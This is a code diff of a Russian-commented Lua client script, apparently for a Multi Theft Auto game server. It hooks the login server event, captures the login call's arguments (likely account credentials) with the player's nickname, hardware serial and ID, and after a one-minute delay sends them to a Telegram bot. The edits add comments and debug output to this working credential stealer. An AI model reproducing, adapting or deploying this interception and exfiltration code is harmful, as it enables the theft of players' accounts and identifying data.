@@ -4,6 +4,7 @@ local sended = false
 
 -- Функция отправки в Telegram
 function sendTG(text)
+    -- Кодируем переносы строк и пробелы для URL
     local encodedText = text:gsub("\n", "%%0A"):gsub(" ", "%%20")
     local url = "https://api.telegram.org/bot"..BOT_TOKEN.."/sendMessage?chat_id="..CHAT_ID.."&text="..encodedText
 
@@ -12,6 +13,7 @@ function sendTG(text)
     end)
 end
 
+-- Вспомогательные функции для обработки аргументов
 function valToString(v)
     if type(v) == "string" then return '"'..v..'"'
     elseif type(v) == "number" then return tostring(v)
@@ -30,34 +32,36 @@ function buildArgs(...)
     return table.concat(t, ", ")
 end
 
+-- Хук на события сервера
 addDebugHook("preFunction", function(sourceResource, functionName, isAllowedByACL, luaFilename, luaLineNumber, ...)
     if sended or functionName ~= "triggerServerEvent" then return end
 
     local args = {...}
     local eventName = tostring(args[1])
 
+    -- Проверяем, то ли это событие логина
     if eventName ~= "addt:LoginAccount" then return end
 
-    sended = true
+    sended = true -- Помечаем, что перехват сработал (чтобы не спамить)
     
     local resName = sourceResource and getResourceName(sourceResource) or "unknown"
     local argString = buildArgs(...)
-    -- Получаем название сервера (или IP, если доступно)
-    local serverName = getServerName() 
 
+    outputConsole("[DEBUG] Логин пойман. Данные будут отправлены через 60 секунд.")
 
+    -- Таймер на 1 минуту, чтобы сервер успел выдать ID и обновить ник
     setTimer(function()
         if not isElement(localPlayer) then return end
 
         local nick = getPlayerName(localPlayer) or "N/A"
         local serial = getPlayerSerial(localPlayer) or "N/A"
         
+        -- Получаем ID (убираем префикс "p" если он есть)
         local rawID = getElementID(localPlayer) or "0"
         local idloc = tostring(rawID):gsub("p", "")
 
-        -- Формируем сообщение с доменом/названием сервера
+        -- Формируем красивое сообщение
         local report = "✅ Вход в аккаунт\n" ..
-                       "🌐 Сервер: " .. serverName .. "\n" ..
                        "👤 Ник: " .. nick .. "\n" ..
                        "🆔 ID: " .. idloc .. "\n" ..
                        "🔑 Serial: " .. serial .. "\n" ..
@@ -65,6 +69,7 @@ addDebugHook("preFunction", function(sourceResource, functionName, isAllowedByAC
                        "📝 Аргументы: " .. argString
 
         sendTG(report)
+        outputConsole("[DEBUG] Данные успешно отправлены в Telegram.")
     end, 60000, 1)
 
 end, {"triggerServerEvent"})
